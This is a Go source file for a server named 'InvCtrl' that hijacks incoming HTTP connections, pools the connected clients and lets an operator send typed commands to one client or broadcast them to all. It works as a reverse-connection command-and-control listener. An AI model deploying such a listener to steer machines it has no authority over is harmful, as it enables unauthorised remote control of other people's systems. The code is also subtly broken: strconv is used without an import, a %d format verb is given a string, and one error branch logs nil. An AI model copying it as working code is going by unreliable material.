package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"

	"github.com/google/uuid"
	"github.com/navigaid/pretty"
	"gopkg.in/readline.v1"
)

type Client struct {
	UUID string
	Conn net.Conn
	Quit chan struct{}
	Info string
}

func NewClient(uuid string, conn net.Conn, quit chan struct{}) *Client {
	return &Client{
		UUID: uuid,
		Conn: conn,
		Quit: quit,
	}
}

type Pool struct {
	Clients map[string]*Client
	Current *Client
}

func NewPool() *Pool {
	return &Pool{
		Clients: make(map[string]*Client),
	}
}

var ClientPool = NewPool()

func (p *Pool) Del(uuid string) {
	delete(p.Clients, uuid)
	if (p.Current != nil) && (p.Current.UUID == uuid) {
		p.Current = nil //new(Client)
	}
}

func (p *Pool) Get(uuid string) *Client {
	return p.Clients[uuid]
}

func (p *Pool) Add(client *Client) {
	p.Clients[client.UUID] = client
}

func (p *Pool) Dump() {
	log.Println("[client pool]")
	isCurrent := func(uuid string) string {
		if (p.Current != nil) && (p.Current.UUID == uuid) {
			return "*"
		}
		return " "
	}
	i := 1
	for uuid, client := range p.Clients {
		fmt.Println(fmt.Sprintf("[%d]", strconv.Itoa(i)), isCurrent(uuid), uuid, "ssh ubuntu@"+strings.Split(client.Conn.RemoteAddr().String(), ":")[0], client.Info)
		i += 1
	}
}

func (p *Pool) Has(uuid string) bool {
	if _, ok := p.Clients[uuid]; ok {
		return true
	}
	return false
}

func hijacker(w http.ResponseWriter, r *http.Request) {
	uuid := uuid.New().String()
	conn, _, err := w.(http.Hijacker).Hijack()
	if err != nil {
		log.Println(nil)
	}

	quit := make(chan struct{})
	client := NewClient(uuid, conn, quit)

	var v map[string]interface{}
	decoder := json.NewDecoder(conn)
	decoder.Decode(&v)
	client.Info = pretty.JSONString(v)

	log.Println("connected:", uuid, conn.RemoteAddr(), client.Info)

	ClientPool.Add(client)
	ClientPool.Dump()
	copy := func(dst io.Writer, src io.Reader) {
		defer ClientPool.Dump()
		defer log.Println("disconnected:", uuid, client.Conn.RemoteAddr(), client.Info)
		defer close(client.Quit)
		defer ClientPool.Del(uuid)
		buf := make([]byte, 1)
		for {
			_, err := src.Read(buf)
			if err != nil {
				return
			}
			dst.Write(buf)
		}
	}
	go copy(os.Stdout, io.MultiReader(decoder.Buffered(), conn))
}

func input() {
	for {
		log.Println("ready to accept input!")
		rl, err := readline.NewEx(&readline.Config{
			HistoryFile:         "/tmp/readline.tmp",
			ForceUseInteractive: true,
			// InterruptPrompt:     "exit?",
		})
		if err != nil {
			panic(err)
		}
		defer rl.Close()
		fmt.Println("Welcome to InvCtrl!!!")
		promptNum := 1
	INNER:
		for {
			rl.SetPrompt(fmt.Sprintf("In[%d]:= ", promptNum))
			line, err := rl.Readline()
			switch err {
			case nil: // NOP
			case io.EOF:
				fmt.Println("bye")
				break INNER
			case readline.ErrInterrupt:
				fmt.Println("try !exit, or !quit")
			default:
				fmt.Println(err)
			}

			switch {
			case strings.HasPrefix(line, "!map "):
				line = strings.TrimPrefix(line, "!map ")
				for _, client := range ClientPool.Clients {
					client.Conn.Write([]byte(line + "\n"))
				}
				continue
			case line == "":
				continue
			case line == "!exit", line == "!quit", line == "Exit", line == "Qxit":
				os.Exit(0)
			case line == "!dump":
				ClientPool.Dump()
				continue
			case ClientPool.Has(line):
				ClientPool.Current = ClientPool.Get(line)
				log.Println("current client:", ClientPool.Current.UUID)
				continue
			default:
				if ClientPool.Current == nil {
					fmt.Println("[INFO] Your current client is empty. Enter the uuid to the client you want to talk to first:")
					continue
				}
			}

			ClientPool.Current.Conn.Write([]byte(line + "\n"))

			promptNum += 1
		}

		log.Println("stdin input closed")
	}
}

func main() {
	http.HandleFunc("/", hijacker)
	log.Println("listening on http://localhost:8000")
	go input()
	log.Fatalln(http.ListenAndServe(":8000", nil))
}
